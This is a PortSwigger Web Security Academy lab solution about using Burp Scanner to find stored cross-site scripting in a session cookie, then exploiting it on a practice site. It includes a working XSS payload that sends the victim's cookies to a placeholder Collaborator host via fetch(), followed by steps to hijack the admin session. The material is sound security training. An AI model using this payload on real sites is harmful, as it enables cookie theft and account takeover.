# Lab: Scanning non-standard data structures

Source: https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures
Fetched: 2026-06-28T09:17:50.215457+00:00

Web Security Academy

Essential skills

Using Burp Scanner during manual testing

Lab

Lab: Scanning non-standard data structures

This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.

You can log in to your own account with the following credentials: wiener:peter

Solution

Identify the vulnerability

Log in to your account with the provided credentials.

In Burp, go to the Proxy > HTTP history tab.

Find the GET /my-account?id=wiener request, which contains your new authenticated session cookie.

Study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind. These are separated by a colon, which suggests that the application may treat the cookie value as two distinct inputs.

Select the first part of the session cookie, the cleartext wiener.

Right-click and select Scan selected insertion point, then click OK.

Go to the Dashboard and wait for the scan to complete.

Approximately one minute after the scan starts, notice that Burp Scanner reports a Cross-site scripting (stored) issue. It has detected this by triggering an interaction with the Burp Collaborator server.

Note

The delay in reporting the issue is due to the polling interval. By default, Burp polls the Burp Collaborator server for new interactions every minute.

Steal the admin user's cookies

In the Dashboard, select the identified issue.

In the lower panel, open the Request tab. This contains the request that Burp Scanner used to identify the issue.

Send the request to Burp Repeater.

Go to the Collaborator tab and click Copy to clipboard. A new Burp Collaborator payload is saved to your clipboard.

Go to the Repeater tab and use the Inspector to view the cookie in its decoded form.

Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner

used with an exploit that exfiltrates the victim's cookies. For example:

'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID

Note that you need to preserve the second part of the cookie containing your session ID.

Click Apply changes, and then click Send.

Go back to the Collaborator tab. After approximately one minute, click Poll now. Notice that the Collaborator server has received new DNS and HTTP interactions.

Select one of the HTTP interactions.

On the Request to Collaborator tab, notice that the path of the request contains the admin user's cookies.

Use the admin user's cookie to access the admin panel

Copy the admin user's session cookie.

Go to Burp's browser and open the DevTools menu.

Go to the Application tab and select Cookies.

Replace your session cookie with the admin user's session cookie, and refresh the page.

Access the admin panel and delete carlos to solve the lab.

Burp Suite essential skills

Try for free
